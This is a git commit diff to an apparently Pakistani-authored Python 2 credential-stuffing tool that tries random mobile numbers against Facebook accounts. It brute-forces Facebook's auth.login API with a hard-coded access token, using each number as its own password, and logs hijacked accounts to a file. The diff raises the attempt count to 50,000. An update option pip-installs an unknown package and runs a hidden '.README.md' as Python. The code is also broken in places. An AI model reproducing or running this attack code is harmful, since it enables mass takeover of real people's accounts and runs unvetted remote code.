04766e650605c3f80c54589bdd14f40e70d6de3e
ArbabMemon <64311080+ArbabMemon@users.noreply.github.com>
2020-09-24 14:00:27 +0500

    Update 1.py

--- 1.py
+++ 1.py
@@ -5,7 +5,7 @@
 #Reserved2020
 import os,sys,time,datetime,random,hashlib,re,threading,json,urllib,cookielib,getpass
 os.system('rm -rf .txt')
-for n in range(5000):
+for n in range(50000):
  
     nmbr = random.randint(1111111, 9999999)
     
@@ -71,3 +71,169 @@ logo='''
 \x1b[1;94m➣  Disclamiar :AWAY FROM ILLIGAL WAY.
 \x1b[1;93m--------------------------------------------------------------"""
                                 '''
+
+back = 0
+successful = []
+cpb = []
+oks = []
+id = []
+def menu():
+	os.system('clear')
+	print logo
+	print "\033[1;97mCYBER_HACKER_GLAXY"
+	print "\033[1;97mRIGHT_HANDED_PLAYER"
+	print "\033[1;97mMOST_WELCOME_DEAR"
+	print
+        print "\033[1;91mATTACK ON PAKISTAN NETWORKS"
+	print "\033[1;92m[1]  MOBILINK"
+	print "\033[1;92m[2]  TELINOR"
+	print "\033[1;92m[3]  WARID"
+	print "\033[1;92m[4]  UFONE"
+	print "\033[1;92m[5]  ZONG"
+	print "\033[1;92m[6]  UPDATE SYSTEM"
+	print "\033[1;92m[0]  EXIT_KALTI MAR"	    
+	print 50*'-'
+	action()
+	
+	def action():
+	bch = raw_input('\n  ENTER HERE ANY CODE   ')
+	if bch =='':
+		print '[!] Fill in correctly'
+		action()
+	elif bch =="1":
+		os.system("clear")
+		print (logo)
+		print "\033[1;91mMOBILINK/JAZZ CODE HERE"		
+		print "\033[1;95m00, 01, 02, 03, 04,"
+		print "\033[1;95m05, 06, 07, 08, 09,"
+		try:
+			c = raw_input(" SELECTED CODE: ")
+			k="+923"
+			idlist = ('.txt')
+			for line in open(idlist,"r").readlines():
+				id.append(line.strip())
+		except IOError:
+			print ("[!] File Not Found")
+			raw_input("\n[ Back ]")
+			menu()
+	elif bch =="2":			
+		os.system("clear")
+		print (logo)
+		print "\033[1;91mTELINORE CODE HERE"		
+		print "\033[1;94m40, 41, 42, 43, 44,"
+		print "\033[1;95m45, 64, ??, ??, ??,"
+		try:
+			c = raw_input(" SELECTED CODE: ")
+			k="+923"
+			idlist = ('.txt')
+			for line in open(idlist,"r").readlines():
+				id.append(line.strip())
+		except IOError:
+			print ("[!] File Not Found")
+			raw_input("\n[ Back ]")
+			menu()
+	elif bch =="3":			
+		os.system("clear")
+		print (logo)
+		print "\033[1;91mWARID CODE HERE"		
+		print "\033[1;94m20, 21, 22, 23,"
+		print "\033[1;95m24, ??, ??, ??,"
+		try:
+			c = raw_input(" SELECTED CODE: ")
+			k="+923"
+			idlist = ('.txt')
+			for line in open(idlist,"r").readlines():
+				id.append(line.strip())
+		except IOError:
+			print ("[!] File Not Found")
+			raw_input("\n[ Back ]")
+			menu()	
+	elif bch =="4":			
+		os.system("clear")
+		print (logo)
+		print "\033[1;91mUFONE CODE HERE"		
+		print "\033[1;94m31, 32, 33, 34,"
+		print "\033[1;95m35, 36, 37, ??,"
+		try:
+			c = raw_input(" SELECTED CODE: ")
+			k="+923"
+			idlist = ('.txt')
+			for line in open(idlist,"r").readlines():
+				id.append(line.strip())
+		except IOError:
+			print ("[!] File Not Found")
+			raw_input("\n[ Back ]")
+			menu()	
+	elif bch =="5":			
+		os.system("clear")
+		print (logo)
+		print "\033[1;91mZONG CODE HERE"		
+		print "\033[1;94m10, 11, 12, 13,"
+		print "\033[1;95m14, 15, 16, 17,"
+		try:
+			c = raw_input(" SELECTED CODE: ")
+			k="+923"
+			idlist = ('.txt')
+			for line in open(idlist,"r").readlines():
+				id.append(line.strip())
+		except IOError:
+			print ("[!] File Not Found")
+			raw_input("\n[ Back ]")
+			menu()
+	elif bch =="6":
+	    os.system("clear")
+	    os.system("pip2 install --upgrade balln")
+	    os.system("pip2 install --upgrade balln")
+	    os.system("clear")
+	    print(logo)
+	    print
+	    psb (" Tool has been successfully updated")
+	    time.sleep(2)
+	    os.system("python2 .README.md")
+#	elif chb =='3':	
+#	    os.system('xdg-open https://www.facebook.com/100002059014174/posts/2677733205638620/?substory_index=0&app=fbl')
+#	    time.sleep(1)
+#	    menu()
+	elif bch =='0':
+		exb()
+	else:
+		print '[!] Fill in correctly'
+		action()
+ 
+	xxx = str(len(id))
+	psb ('[✓] Total Numbers: '+xxx)
+	time.sleep(0.5)
+	psb ('[✓] Please wait, process is running ...')
+	time.sleep(0.5)
+	psb ('[!] To Stop Process Press CTRL Then Press z')
+	time.sleep(0.5)
+	print 50*'-'
+	print
+	
+			
+	def main(arg):
+		global cpb,oks
+		user = arg
+		try:
+			os.mkdir('save')
+		except OSError:
+			pass
+		try:
+			pass1 = user
+			data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' +k+c+user+ '&locale=en_US&password=' + pass1 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
+			q = json.load(data)
+			if 'access_token' in q:
+				print '\x1b[1;92mARBAB-HACKED]\x1b[0m ' + k + c + user + ' | ' + pass1+'\n'+"\n"
+				okb = open('save/successfull.txt', 'a')
+				okb.write(k+c+user+'|'+pass1+'\n')
+				okb.close()
+				oks.append(c+user+pass1)
+			else:
+				if 'www.facebook.com' in q['error_msg']:
+					print '[MEMON-CP] ' + k + c + user + ' | ' + pass1+'\n'
+					cps = open('save/checkpoint.txt', 'a')
+					cps.write(k+c+user+'|'+pass1+'\n')
+					cps.close()
+					cpb.append(c+user+pass1)
+		
+		
